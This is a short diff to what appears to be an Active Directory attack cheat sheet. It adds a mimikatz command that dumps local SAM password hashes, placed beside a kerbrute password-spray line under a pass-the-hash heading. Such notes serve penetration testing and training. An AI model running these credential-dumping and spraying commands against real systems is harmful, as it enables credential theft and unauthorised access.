@@ -156,6 +156,12 @@ kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 
 ### Pass the hash
 
+- Access local SAM database and dump all local hashes
+
+```powershell
+PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
+```
+
 - Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
 
 ```powershell
